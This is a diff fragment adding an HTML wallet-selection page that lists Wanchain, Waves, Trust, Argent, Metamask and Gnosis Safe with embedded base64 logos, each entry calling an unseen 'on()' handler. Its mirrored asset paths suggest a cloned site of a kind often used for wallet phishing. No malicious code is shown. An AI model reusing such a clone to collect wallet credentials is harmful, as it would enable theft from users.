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" />
+                    </p>Wanchain Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="data:image/png;base64,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" />
+                    </p>Waves Wallet
+                </div>
+
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px"
+                            src="../trustwallet.com/assets/images/media/assets/vertical_blue.png" />
+                    </p>Trust
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px"
+                            src="../external.html?link=https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco/wfinmip7eotoaqtedmfl" />
+                    </p>Argent
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px"
+                            src="data:image/png;base64,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" />
+                    </p>Metamask
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px"
+                            src="../pbs.twimg.com/profile_images/1261314954726006785/5unhdQbm_400x400.html" />
+                    </p>Gnosis Safe Multisig
+                </div>
+
+            </div>
+
+            <div class="col-sm-2"></div>
+        </div>
+
+        <!--Crypto Wallet Section Ends-->
+    </div>
+    <!--Content Area Ends-->
+
+    <!--Footer Starts-->
+    <div class="container">
+        <div class="row">
+    <div class="col-sm-12 f1">
+        Open a pull
+        request on <a href=".html" style="color: #4199fc; font-weight: 550;">Github</a> to add
+        your wallet here.
+    </div>
+</div>
+<div class="row">
+    <div class="col-sm-3"></div>
+
+    <div class="col-sm-6 f2">
+        <div class="row">
+            <div class="col-sm-4" style="padding-bottom: 5px;">
+                <a href=".html"><svg xmlns="http://www.w3.org/2000/svg" style="color: #587087;" width="21" height="21"
+                        fill="currentColor" class="bi bi-discord" viewBox="0 0 16 16">
+                        <path
+                            d="M6.552 6.712c-.456 0-.816.4-.816.888s.368.888.816.888c.456 0 .816-.4.816-.888.008-.488-.36-.888-.816-.888zm2.92 0c-.456 0-.816.4-.816.888s.368.888.816.888c.456 0 .816-.4.816-.888s-.36-.888-.816-.888z" />
+                        <path
+                            d="M13.36 0H2.64C1.736 0 1 .736 1 1.648v10.816c0 .912.736 1.648 1.64 1.648h9.072l-.424-1.48 1.024.952.968.896L15 16V1.648C15 .736 14.264 0 13.36 0zm-3.088 10.448s-.288-.344-.528-.648c1.048-.296 1.448-.952 1.448-.952-.328.216-.64.368-.92.472-.4.168-.784.28-1.16.344a5.604 5.604 0 0 1-2.072-.008 6.716 6.716 0 0 1-1.176-.344 4.688 4.688 0 0 1-.584-.272c-.024-.016-.048-.024-.072-.04-.016-.008-.024-.016-.032-.024-.144-.08-.224-.136-.224-.136s.384.64 1.4.944c-.24.304-.536.664-.536.664-1.768-.056-2.44-1.216-2.44-1.216 0-2.576 1.152-4.664 1.152-4.664 1.152-.864 2.248-.84 2.248-.84l.08.096c-1.44.416-2.104 1.048-2.104 1.048s.176-.096.472-.232c.856-.376 1.536-.48 1.816-.504.048-.008.088-.016.136-.016a6.521 6.521 0 0 1 4.024.752s-.632-.6-1.992-1.016l.112-.128s1.096-.024 2.248.84c0 0 1.152 2.088 1.152 4.664 0 